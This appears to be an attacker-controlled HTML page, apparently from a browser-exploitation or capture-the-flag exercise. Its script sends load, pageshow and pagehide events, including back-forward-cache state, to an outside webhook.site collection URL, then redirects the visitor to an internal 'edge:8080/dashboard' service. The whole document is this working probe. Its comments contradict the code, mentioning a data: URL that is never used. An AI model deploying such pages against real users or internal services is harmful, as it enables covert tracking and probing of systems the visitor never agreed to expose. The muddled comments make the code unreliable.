<!doctype html><meta charset="utf-8">
<body>
<script>
const W="https://webhook.site/4870c85a-b9e2-4532-ac83-8c07bae03b80/";
addEventListener("pageshow", e => {
  new Image().src = W + "?evt=pageshow&persisted=" + e.persisted;
});
addEventListener("pagehide", e => {
  new Image().src = W + "?evt=pagehide&persisted=" + e.persisted;
});
// navigate forward; the edge dashboard page will sit, then we rely on
// the browser's own history. We trigger back via a popup-free timer that
// survives by navigating to a data: URL we control instead of edge first.
new Image().src = W + "?evt=load";
setTimeout(() => { location.href = "http://edge:8080/dashboard"; }, 2000);
</script>
</body>
